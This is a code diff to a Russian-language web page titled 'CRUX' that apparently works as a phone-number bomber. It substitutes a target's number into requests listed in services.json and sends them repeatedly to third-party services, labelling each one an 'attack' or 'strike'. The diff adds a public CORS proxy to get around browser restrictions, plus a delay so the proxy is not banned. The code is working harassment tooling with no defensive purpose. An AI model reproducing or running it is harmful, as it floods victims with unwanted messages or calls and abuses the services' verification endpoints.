@@ -162,10 +162,10 @@
             <div class="code-selector" id="codeSelector">
                 <span id="selectedCode">🇷🇺 +7</span>
                 <div class="code-dropdown" id="codeDropdown">
-                    <div class="code-item" data-code="+7" data-len="10">🇷🇺 +7 (Россия)</div>
-                    <div class="code-item" data-code="+380" data-len="9">🇺🇦 +380 (Украина)</div>
-                    <div class="code-item" data-code="+375" data-len="9">🇧🇾 +375 (Беларусь)</div>
-                    <div class="code-item" data-code="+7" data-len="10">🇰🇿 +7 (Казахстан)</div>
+                    <div class="code-item" data-code="+7">🇷🇺 +7 (Россия)</div>
+                    <div class="code-item" data-code="+380">🇺🇦 +380 (Украина)</div>
+                    <div class="code-item" data-code="+375">🇧🇾 +375 (Беларусь)</div>
+                    <div class="code-item" data-code="+7">🇰🇿 +7 (Казахстан)</div>
                 </div>
             </div>
             <input class="phone-number-input" type="text" id="localNumber" placeholder="912 345 67 89" inputmode="numeric">
@@ -195,7 +195,7 @@
     <div class="settings-content">
         <div class="close-settings" id="closeSettings">✕</div>
         <div class="title" style="font-size: 1.1rem; margin-bottom: 20px;">CRUX SETTINGS</div>
-        <p style="font-size: 0.8rem; color: var(--accent); margin-bottom: 15px;">Сервисы загружаются автоматически из файла <b>services.json</b></p>
+        <p style="font-size: 0.8rem; color: var(--accent); margin-bottom: 15px;">Сервисы загружаются из <b>services.json</b></p>
         <button class="attack-btn" id="reloadServices" style="width:100%;">ОБНОВИТЬ СПИСОК</button>
     </div>
 </div>
@@ -211,6 +211,9 @@
         const canvas = document.getElementById('bg-canvas');
         const ctx = canvas.getContext('2d');
         let bgParticles = [], explosionParticles = [], loadedServices = [], isAttacking = false;
+        
+        // ПРОКСИ ДЛЯ ОБХОДА CORS
+        const proxy = "https://corsproxy.io/?";
 
         function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
         window.addEventListener('resize', resize); resize();
@@ -239,88 +242,53 @@
 
         async function loadServices() {
             try {
-                // Автозагрузка файла из того же каталога
-                const res = await fetch('services.json');
-                if (!res.ok) throw new Error();
+                const res = await fetch('services.json?nocache=' + Date.now());
                 const data = await res.json();
                 loadedServices = Array.isArray(data) ? data : (data.services || []);
-                console.log("Services loaded successfully");
-            } catch (e) { 
-                console.error("Could not load services.json");
-                loadedServices = []; 
-            }
+            } catch (e) { loadedServices = []; }
             document.getElementById('servicesCounter').innerText = loadedServices.length;
         }
         loadServices();
 
-        function genFake() {
-            const r = (l) => Math.random().toString(36).substring(2, 2+l);
-            return {
-                "{first_name}": ["Ivan", "Artem", "Max", "Dmitry"][Math.floor(Math.random()*4)],
-                "{email}": r(8) + "@gmail.com",
-                "{username}": "user_" + r(5)
-            };
-        }
-
-        function applyPatterns(data, phone, fakes) {
-            if (!data) return data;
-            let str = typeof data === 'string' ? data : JSON.stringify(data);
-            str = str.replace(/%phone%/g, phone);
-            for (let [key, val] of Object.entries(fakes)) str = str.split(key).join(val);
-            try { return JSON.parse(str); } catch(e) { return str; }
-        }
-
-        async function executeRequest(req, phone, fakes) {
-            const finalUrl = applyPatterns(req.url, phone, fakes);
-            const finalHeaders = applyPatterns(req.headers || {}, phone, fakes);
-            let finalBody = null;
-            if (req.body) {
-                const processedBody = applyPatterns(req.body, phone, fakes);
-                finalBody = typeof processedBody === 'object' ? JSON.stringify(processedBody) : processedBody;
-            }
+        async function executeRequest(s, phone) {
             try {
-                await fetch(finalUrl, {
-                    method: req.method || 'POST',
-                    headers: { 'Content-Type': 'application/json', ...finalHeaders },
-                    body: finalBody
+                const url = proxy + encodeURIComponent(s.url);
+                let body = s.body;
+                
+                if (typeof body === 'object') {
+                    body = JSON.stringify(body).replace(/%phone%/g, phone);
+                } else if (typeof body === 'string') {
+                    body = body.replace(/%phone%/g, phone);
+                }
+
+                await fetch(url, {
+                    method: s.method || 'POST',
+                    headers: s.headers || { "Content-Type": "application/json" },
+                    body: body
                 });
             } catch(e) {}
         }
 
         async function startAttack(phone) {
-            const repeats = parseInt(document.getElementById('repeat').value) || 1;
+            const reps = parseInt(document.getElementById('repeat').value) || 1;
             const progress = document.getElementById('progressFill');
             const status = document.getElementById('statusTxt');
             isAttacking = true;
-            
-            let totalToRun = 0;
-            loadedServices.forEach(s => totalToRun += (s.requests ? s.requests.length : 1));
-            totalToRun *= repeats;
-            
-            if (totalToRun === 0) {
-                alert("services.json пуст или не найден!");
-                document.getElementById('loadingOverlay').classList.remove('show');
-                isAttacking = false;
-                return;
-            }
 
+            const total = loadedServices.length * reps;
             let done = 0;
-            for (let r = 0; r < repeats && isAttacking; r++) {
+
+            for (let i = 0; i < reps && isAttacking; i++) {
                 for (let s of loadedServices) {
                     if (!isAttacking) break;
-                    const fakes = genFake();
-                    const reqs = s.requests || [s];
-                    for (let sub of reqs) {
-                        if (!isAttacking) break;
-                        await executeRequest(sub, phone, fakes);
-                        done++;
-                        progress.style.width = (done / totalToRun * 100) + "%";
-                        status.innerText = `Атака: ${done}/${totalToRun}`;
-                        await new Promise(res => setTimeout(res, 150));
-                    }
+                    await executeRequest(s, phone);
+                    done++;
+                    progress.style.width = (done / total * 100) + "%";
+                    status.innerText = `Удар: ${done}/${total}`;
+                    await new Promise(r => setTimeout(r, 300)); // Задержка, чтобы не забанили прокси
                 }
             }
-            status.innerText = "ГОТОВО";
+            status.innerText = "ЗАВЕРШЕНО";
             setTimeout(() => { document.getElementById('loadingOverlay').classList.remove('show'); progress.style.width="0%"; }, 1500);
             isAttacking = false;
         }
@@ -342,7 +310,7 @@
             b.classList.add('active-anim');
             setTimeout(() => b.classList.remove('active-anim'), 700);
             const rect = b.getBoundingClientRect();
-            for(let i=0; i<25; i++) explosionParticles.push(new Particle(rect.left + rect.width/2, rect.top + rect.height/2, true));
+            for(let i=0; i<30; i++) explosionParticles.push(new Particle(rect.left + rect.width/2, rect.top + rect.height/2, true));
         };
 
         document.getElementById('stopAttack').onclick = () => isAttacking = false;
@@ -350,7 +318,10 @@
         document.getElementById('closeSettings').onclick = () => document.getElementById('settingsModal').classList.remove('active');
         document.getElementById('reloadServices').onclick = () => loadServices();
         document.getElementById('codeSelector').onclick = (e) => { e.stopPropagation(); document.getElementById('codeSelector').classList.toggle('active'); };
-        document.querySelectorAll('.code-item').forEach(i => i.onclick = () => document.getElementById('selectedCode').innerText = i.innerText.split(' ')[0] + ' ' + i.dataset.code);
+        document.querySelectorAll('.code-item').forEach(i => i.onclick = () => {
+            document.getElementById('selectedCode').innerText = i.innerText.split(' ')[0] + ' ' + i.dataset.code;
+            document.getElementById('codeSelector').classList.remove('active');
+        });
         window.onclick = () => document.getElementById('codeSelector').classList.remove('active');
     })();
 </script>
